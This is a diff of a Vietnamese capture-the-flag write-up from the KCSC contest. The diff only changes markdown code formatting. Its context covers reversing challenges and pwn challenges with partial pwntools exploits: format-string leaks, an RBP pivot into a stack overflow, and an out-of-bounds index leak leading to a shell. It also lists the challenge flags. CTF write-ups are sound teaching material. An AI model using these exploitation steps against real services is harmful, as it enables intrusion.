@@ -45,15 +45,15 @@ Trời mùa thu Hà Nội thật đẹp, nó sẽ đẹp hơn rất nhiều nế
 
 **Solution**
 
-Flow chương trình rất ngắn gọn. Mảng **`Str[]`** sẽ được decrypt bởi thuật toán RC4 với **`key`** = **`F@**!`**. Sau đó chương trình so sánh **`input`** nhập vào với **`output`** là kết quả của giải mã mảng trên. 
+Flow chương trình rất ngắn gọn. Mảng `Str[]` sẽ được decrypt bởi thuật toán RC4 với `key` = `F@**!`. Sau đó chương trình so sánh `input` nhập vào với `output` là kết quả của giải mã mảng trên. 
 
 <img src="1.png"/>
 
-Bật debug lên và check **`output`**, ta nhận được một fake flag 
+Bật debug lên và check `output`, ta nhận được một fake flag 
 
 <img src="2.png"/>
 
-Mình xref **`key`** thì thấy nó còn được xuất hiện trong hàm **`sub_7FF7423313D0`**
+Mình xref `key` thì thấy nó còn được xuất hiện trong hàm `sub_7FF7423313D0`
 ```c
 __int64 sub_7FF7423313D0()
 {
@@ -68,17 +68,17 @@ __int64 sub_7FF7423313D0()
 }
 ```
 
-Vậy khả năng cao đây là hàm anti-debug. Nếu chúng ta debug thì sẽ nhận được key fake, mình đặt breakpoint tại hàm này, sửa lại giá trị cho thanh ghi **`ZF`** và thu được key chính xác là **`FA++!`**
+Vậy khả năng cao đây là hàm anti-debug. Nếu chúng ta debug thì sẽ nhận được key fake, mình đặt breakpoint tại hàm này, sửa lại giá trị cho thanh ghi `ZF` và thu được key chính xác là `FA++!`
 
-Sau khi có key đúng thì kết quả decrypt vẫn sai. Có một vấn đề là dù **`input`** của mình khác nhau nhưng chương trình vẫn luôn in ra **`Correct!`**. Tới đây thì mình đoán được luôn hàm **`lstrcmpA`** đã bị thay đổi. 
+Sau khi có key đúng thì kết quả decrypt vẫn sai. Có một vấn đề là dù `input` của mình khác nhau nhưng chương trình vẫn luôn in ra `Correct!`. Tới đây thì mình đoán được luôn hàm `lstrcmpA` đã bị thay đổi. 
 
 > Nếu các bạn chơi giải KCSC/KMA đủ nhiều sẽ biết kỹ thuật này thường xuyên được sử dụng. 
 
-Đi sâu vào hàm **`lstrcmpA`**, ta thấy flag được tạo ra bằng cách xor **`output`** với một mảng **`Str[]`** khác và luôn return 0. Đây cũng là lý do tại sao chương trình luôn in ra **`Correct!`**. 
+Đi sâu vào hàm `lstrcmpA`, ta thấy flag được tạo ra bằng cách xor `output` với một mảng `Str[]` khác và luôn return 0. Đây cũng là lý do tại sao chương trình luôn in ra `Correct!`. 
 
 <img src="3.png" height="600" style="display: block; margin-left: auto; margin-right: auto;"/>
 
-Flag thu được là **`KCSC{1t_co5ld_be_right7_fla9_here_^.^@@}`**
+Flag thu được là `KCSC{1t_co5ld_be_right7_fla9_here_^.^@@}`
 
 ## rev/RE x Rust
 
@@ -92,7 +92,7 @@ Flag thu được là **`KCSC{1t_co5ld_be_right7_fla9_here_^.^@@}`**
 
 **Solution**
 
-Quan sát tổng quan, chương trình đọc dữ liệu từ file **`flag.txt`**, thực hiện encrypt qua 4 phase và ghi dữ liệu vào file **`flag.enc`**. 
+Quan sát tổng quan, chương trình đọc dữ liệu từ file `flag.txt`, thực hiện encrypt qua 4 phase và ghi dữ liệu vào file `flag.enc`. 
 
 <img src="./4.png">
 
@@ -146,7 +146,7 @@ __int64 __fastcall revsrust::phase1::hff4818a749ae18af(char *input, unsigned __i
 
 ### Phase 2 
 
-Ở phase này, chương trình hoán vị 4 bit sau của byte này với 4 bit sau của byte kia. Ví dụ **`0x12`**, **`0x34`** sẽ thành **`0x14`**, **`0x32`**. 
+Ở phase này, chương trình hoán vị 4 bit sau của byte này với 4 bit sau của byte kia. Ví dụ `0x12`, `0x34` sẽ thành `0x14`, `0x32`. 
 
 ```c
 unsigned __int64 __fastcall revsrust::phase2::hf6a223748e1b24a0(char *rev_input, unsigned __int64 input_length)
@@ -258,7 +258,7 @@ for i in range(len(flag) - 2):
     flag[i] = (flag[i] - flag[i+2]) & 0xFF
     flag[i+2] = (flag[i+2] - flag[i]) & 0xFF 
 ```
-Chúng ta dễ dàng dựng lại hàm **`rev_phase3`** là 
+Chúng ta dễ dàng dựng lại hàm `rev_phase3` là 
 ```python
 def rev_phase3(flag):
     for i in range(len(flag) - 3, -1, -1):
@@ -269,7 +269,7 @@ def rev_phase3(flag):
 
 ### Phase 4
 
-Ở phase 4 này, chương trình tạo 1 số random 4 byte và xor tất cả các byte với **`input`**. Nếu chú ý, ta sẽ biết được các byte xor với nhau thì kết quả thu được luôn nằm trong khoảng [0, 255]. Từ đây, ta dễ dàng xây dựng hàm **`rev_phase4`** bằng brute-force. 
+Ở phase 4 này, chương trình tạo 1 số random 4 byte và xor tất cả các byte với `input`. Nếu chú ý, ta sẽ biết được các byte xor với nhau thì kết quả thu được luôn nằm trong khoảng [0, 255]. Từ đây, ta dễ dàng xây dựng hàm `rev_phase4` bằng brute-force. 
 
 ```c
 __int64 __fastcall revsrust::phase4::h4b371456b6af0137(BYTE *input, unsigned __int64 input_length)
@@ -310,7 +310,7 @@ for i in range(len(flag)):
     flag[i] ^= (BYTE1 ^ BYTE2 ^ HIBYTE ^ LOBYTE)
 ```
 
-Dễ dàng build được hàm **`rev_phase4`** 
+Dễ dàng build được hàm `rev_phase4` 
 ```python
 def rev_phase4(flag, rd):
     for i in range(len(flag)):
@@ -347,7 +347,7 @@ for i in range(0, 0xff):
     print("".join([chr(i) for i in res]))
 ```
 
-Nhìn sơ qua các kết quả thu được, ta có được flag là **`KCSC{r3v3rs3_rust_1s_funny_4nd_34sy_227da29931351}`**
+Nhìn sơ qua các kết quả thu được, ta có được flag là `KCSC{r3v3rs3_rust_1s_funny_4nd_34sy_227da29931351}`
 
 
 ## rev/behind the scenes
@@ -368,7 +368,7 @@ Updating...
 * 10 solve / 464 pts / by JohnathanHuuTri
 * **Given files:** [banking.zip]()
 * **Description:** Our club KCSC has created a new bank called KCSBank. It's still in beta but we cannot find out any bugs, please help us!\
-**`nc 103.163.24.78 10002`**
+`nc 103.163.24.78 10002`
 {{< /admonition >}}
 
 **Solution**
@@ -397,22 +397,22 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 }
 ```
 
-Với lựa chọn **`general_action`**, chương trình có 3 chức năng: 
+Với lựa chọn `general_action`, chương trình có 3 chức năng: 
 - login
 - register
 - exit
 
-Trong hàm **`register`**, fullname được chứa ở **`ptr_fullname`**. Khi xref, ta thấy nó còn được xuất hiện ở hàm **`info`**.  
+Trong hàm `register`, fullname được chứa ở `ptr_fullname`. Khi xref, ta thấy nó còn được xuất hiện ở hàm `info`.  
 
 <img src="./5.png">
 
-Với lựa chọn **`account_action`**, chương trình có 4 chức năng: 
+Với lựa chọn `account_action`, chương trình có 4 chức năng: 
 - deposit
 - withdraw
 - info
 - logout 
 
-Xem qua một lượt các hàm, ta thấy hàm **`info`** có Format String Bug. 
+Xem qua một lượt các hàm, ta thấy hàm `info` có Format String Bug. 
 ```c
 int info()
 {
@@ -447,7 +447,7 @@ def logout(feedback):
 ```
 
 #### Leak stack & libc 
-Bước đầu tiên, chúng ta sẽ đi tạo một account với fullname là **`payload`** nhằm leak được các giá trị như stack, libc. 
+Bước đầu tiên, chúng ta sẽ đi tạo một account với fullname là `payload` nhằm leak được các giá trị như stack, libc. 
 
 ```python
 payload = b"%6$p|%29$p|"
@@ -468,20 +468,20 @@ log.info(f"libc base = {hex(libc_base)}")
 ### Bug Stack Buffer Overflow 
 
 Về cơ bản, chương trình không có bug BOF. Nhưng chúng ta đang có một số thứ để có thể trigger được bug này. 
-- Chức năng **`logout`** cho nhập feedback có kích thước tối đa 256 byte. 
-- FSB cho phép thay đổi giá trị của thanh ghi **`RBP`**. 
+- Chức năng `logout` cho nhập feedback có kích thước tối đa 256 byte. 
+- FSB cho phép thay đổi giá trị của thanh ghi `RBP`. 
 
-Khi end chương trình, **`RSP`** sẽ nằm ở vị trí **`0x00007fffffffdc48`**, vậy **`RBP`** sẽ là **`0x00007fffffffdc40`**. 
+Khi end chương trình, `RSP` sẽ nằm ở vị trí `0x00007fffffffdc48`, vậy `RBP` sẽ là `0x00007fffffffdc40`. 
 
 <img src="./6.png">
 
-Với FSB đầu tiên, ta thấy **`RBP`** phía trên nằm ngay ở ô stack đầu tiên. Ta hoàn toàn thay đổi được giá trị cho nó. 
+Với FSB đầu tiên, ta thấy `RBP` phía trên nằm ngay ở ô stack đầu tiên. Ta hoàn toàn thay đổi được giá trị cho nó. 
 
 <img src="./7.png">
 
-Feedback của chúng ta được nhập bắt đầu từ **`0x00007fffffffdb10`**. Vậy mình sẽ đưa **`RBP`** về **`0x00007fffffffdb50`** để thử trigger xem. 
+Feedback của chúng ta được nhập bắt đầu từ `0x00007fffffffdb10`. Vậy mình sẽ đưa `RBP` về `0x00007fffffffdb50` để thử trigger xem. 
 
-Lưu ý, giá trị **`stack_leak`** mình có được ở phía trên là **`0x00007fffffffdc20`**. 
+Lưu ý, giá trị `stack_leak` mình có được ở phía trên là `0x00007fffffffdc20`. 
 
 ```python
 fake_rbp = stack_leak - 0xd0 
@@ -493,7 +493,7 @@ login("hacker", 123)
 info()
 ```
 
-Stack layout sau khi mình đổi **`RBP`** và nhập feedback 
+Stack layout sau khi mình đổi `RBP` và nhập feedback 
 
 <img src="./8.png">
 
@@ -592,7 +592,7 @@ logout(payload)
 
 p.interactive() 
 ```
-Flag thu được là **`KCSC{st1ll_buff3r_0v3rfl0w_wh3n_h4s_c4n4ry?!?}`**
+Flag thu được là `KCSC{st1ll_buff3r_0v3rfl0w_wh3n_h4s_c4n4ry?!?}`
 
 ## pwn/Petshop
 
@@ -603,7 +603,7 @@ Flag thu được là **`KCSC{st1ll_buff3r_0v3rfl0w_wh3n_h4s_c4n4ry?!?}`**
   * libc-2.31.so
   * ld-2.31.so 
 * **Description:** Welcome to our new petshop! You can find various kinds of pet, sometimes bugs too.\
-**`nc 103.163.24.78 10001`**
+`nc 103.163.24.78 10001`
 {{< /admonition >}}
 
 **Solution**
@@ -652,7 +652,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 
-Tùy vào từng lựa chọn, các hàm sẽ parse input ra thành các giá trị phù hợp để phục vụ cho việc xử lý của mỗi hàm. Sau khi phân tích sơ qua source code, mình đã tạo một struct **`pet_struct`** như sau: 
+Tùy vào từng lựa chọn, các hàm sẽ parse input ra thành các giá trị phù hợp để phục vụ cho việc xử lý của mỗi hàm. Sau khi phân tích sơ qua source code, mình đã tạo một struct `pet_struct` như sau: 
 ```
 00000000 pet_struct struc ; (sizeof=0x10, mappedto_18)
 00000000 type    dq ?   ; offset
@@ -660,7 +660,7 @@ Tùy vào từng lựa chọn, các hàm sẽ parse input ra thành các giá tr
 00000010 pet_struct ends
 ```
 
-#### Hàm **`buy`**
+#### Hàm `buy`
 
 ```c
 int __fastcall buy(char *a1)
@@ -728,13 +728,13 @@ LABEL_x52C:
 }
 ```
 
-Tóm tắt hàm **`buy`** như sau: 
-- Parse input theo cấu trúc **`buy | pet_type | pet_type_index`**
-- Cho mua một trong hai loại pet: **`dog`** / **`cat`**
+Tóm tắt hàm `buy` như sau: 
+- Parse input theo cấu trúc `buy | pet_type | pet_type_index`
+- Cho mua một trong hai loại pet: `dog` / `cat`
 - Mỗi loại pet có 4 kiểu 
 - Cho phép nhập tên pet tối đa 1024 byte
 
-#### Hàm **`sell`**
+#### Hàm `sell`
 
 ```c
 int __fastcall sell(char *a1)
@@ -766,12 +766,12 @@ int __fastcall sell(char *a1)
 }
 ```
 
-Tóm tắt hàm **`sell`** như sau: 
-- Parse input theo cấu trúc **`sell | pet_list_index`**
-- Cho bán một trong hai loại: **`dog`** / **`cat`**
-- Cho nhập **`reason`** với kích thước **`reason_size`** nằm trong khoảng [1, 511]
+Tóm tắt hàm `sell` như sau: 
+- Parse input theo cấu trúc `sell | pet_list_index`
+- Cho bán một trong hai loại: `dog` / `cat`
+- Cho nhập `reason` với kích thước `reason_size` nằm trong khoảng [1, 511]
 
-#### Hàm **`info`**
+#### Hàm `info`
 
 ```c
 int __fastcall info(const char *a1)
@@ -820,16 +820,16 @@ int __fastcall info(const char *a1)
 }
 ```
 
-Tóm tắt hàm **`info`** như sau: 
-- Parse input theo cấu trúc **`info | option`**
-- Có 3 **`option`** để lựa chọn:
-  - **`dog`**
-  - **`cat`**
-  - **`mine`**: In ra toàn bộ thông tin **`pet_list`** của mình
+Tóm tắt hàm `info` như sau: 
+- Parse input theo cấu trúc `info | option`
+- Có 3 `option` để lựa chọn:
+  - `dog`
+  - `cat`
+  - `mine`: In ra toàn bộ thông tin `pet_list` của mình
 
 ### Bug Out-off-Bound 
 
-Ở hàm **`buy`**, ta nhận thấy rằng **`pet_type_idx`** có thể nhận giá trị âm, từ đó gây nên bug OOB. 
+Ở hàm `buy`, ta nhận thấy rằng `pet_type_idx` có thể nhận giá trị âm, từ đó gây nên bug OOB. 
 
 ```c
 int __fastcall buy(char *a1)
@@ -845,14 +845,14 @@ int __fastcall buy(char *a1)
 }
 ``` 
 
-Tận dụng chức năng in ra toàn bộ thông tin **`pet_list`** của hàm **`info`**. Ta sẽ leak được các giá trị của binary và libc. 
+Tận dụng chức năng in ra toàn bộ thông tin `pet_list` của hàm `info`. Ta sẽ leak được các giá trị của binary và libc. 
 
 #### Leak binary
-Mua một bé mèo với cú pháp **`buy cat 1`**. Do idx sẽ bị trừ đi một, vậy nên em mèo của ta sẽ có tên ở địa chỉ **`cats[0]`**. 
+Mua một bé mèo với cú pháp `buy cat 1`. Do idx sẽ bị trừ đi một, vậy nên em mèo của ta sẽ có tên ở địa chỉ `cats[0]`. 
 
 <img src="./10.png">
 
-Nhìn xung quanh các giá trị lân cận, ta thấy có giá trị **`0x0000555555558008`** là địa chỉ binary. Ta hoàn toàn leak được giá trị đó với **`idx = -2`**.  
+Nhìn xung quanh các giá trị lân cận, ta thấy có giá trị `0x0000555555558008` là địa chỉ binary. Ta hoàn toàn leak được giá trị đó với `idx = -2`.  
 
 ```python
 buy("cat", -2, cyclic(1020)) 
@@ -872,13 +872,13 @@ Sau khi search trong memory, mình không thấy có địa chỉ nào phù hợ
 
 ### Bug Stack Buffer Overflow
 
-Với việc cho nhập **`pet_name`** tối đa tới tận 1024 byte. Mình thoáng nghĩ có điều gì không ổn tại đây. Mình dùng **`cyclic`** tạo thử 1020 byte để xem input này có ảnh hưởng gì tới các hàm khác không. 
+Với việc cho nhập `pet_name` tối đa tới tận 1024 byte. Mình thoáng nghĩ có điều gì không ổn tại đây. Mình dùng `cyclic` tạo thử 1020 byte để xem input này có ảnh hưởng gì tới các hàm khác không. 
 
-Thử vào hàm **`sell`**, đi tới hàm nhập **`reason_size`** thì ta thấy **`reason_size`** đang có giá trị rác **`jaaf`** rất giống trong **`input`** tạo bởi **`cyclic`**. 
+Thử vào hàm `sell`, đi tới hàm nhập `reason_size` thì ta thấy `reason_size` đang có giá trị rác `jaaf` rất giống trong `input` tạo bởi `cyclic`. 
 
 <img src="./11.png">
 
-Từ đây, ta hoàn toàn điều khiển được **`reason_size`** và trigger được bug BOF. Nguyên nhân dẫn tới lỗi này là **`reason_size`** không được initialize, vậy nên nó có thể nhận giá trị rác từ input nào đó. 
+Từ đây, ta hoàn toàn điều khiển được `reason_size` và trigger được bug BOF. Nguyên nhân dẫn tới lỗi này là `reason_size` không được initialize, vậy nên nó có thể nhận giá trị rác từ input nào đó. 
 
 ```c
 int __fastcall sell(char *a1)
@@ -895,9 +895,9 @@ int __fastcall sell(char *a1)
 }
 ```
 
-Chưa hết, ta phải bypass được điều kiện check ở trên. Có một trick với hàm **`scanf`** là nếu như ta nhập input không đúng với định dạng fmt thì hàm sẽ trả về 0 và không làm thay đổi giá trị của đối số. 
+Chưa hết, ta phải bypass được điều kiện check ở trên. Có một trick với hàm `scanf` là nếu như ta nhập input không đúng với định dạng fmt thì hàm sẽ trả về 0 và không làm thay đổi giá trị của đối số. 
 
-Vậy input mình nhập vào đơn giản chỉ là **`-`** sẽ bypass được đoạn check ở trên. 
+Vậy input mình nhập vào đơn giản chỉ là `-` sẽ bypass được đoạn check ở trên. 
 
 ```python
 def sell(pet_list_idx, reason): 
@@ -931,14 +931,14 @@ log.info(f"libc base = {hex(libc_base)}")
 
 ### Get shell 
 
-Hoàn thiện exploit, có được shell của thử thách. Có một vấn đề nhỏ mà chúng ta cần chú ý ở hàm **`sell`** là 
+Hoàn thiện exploit, có được shell của thử thách. Có một vấn đề nhỏ mà chúng ta cần chú ý ở hàm `sell` là 
 ```c
  if ( (unsigned int)__isoc99_sscanf(a1, "%d", &pet_list_idx) != 1 || pet_list_idx > 7 || !pet_list[pet_list_idx] )
     {
         return puts("Seller --> There are no pet in that index!");
     }
 ```
-Nếu chúng ta chỉ tạo 1 con pet thì sau lần sell thứ nhất **`pet_list`** sẽ rỗng. Vậy để hợp lệ hóa cho bước kiểm tra này, mình sẽ tạo thêm 1 con pet nữa.  
+Nếu chúng ta chỉ tạo 1 con pet thì sau lần sell thứ nhất `pet_list` sẽ rỗng. Vậy để hợp lệ hóa cho bước kiểm tra này, mình sẽ tạo thêm 1 con pet nữa.  
 
 ```python
 #!/usr/bin/env python3
@@ -1022,4 +1022,4 @@ sell(1, payload2)
 
 p.interactive() 
 ```
-Flag thu được là **`KCSC{0h_n0_0ur_p3t_h4s_bug?!????????????????????}`**
+Flag thu được là `KCSC{0h_n0_0ur_p3t_h4s_bug?!????????????????????}`
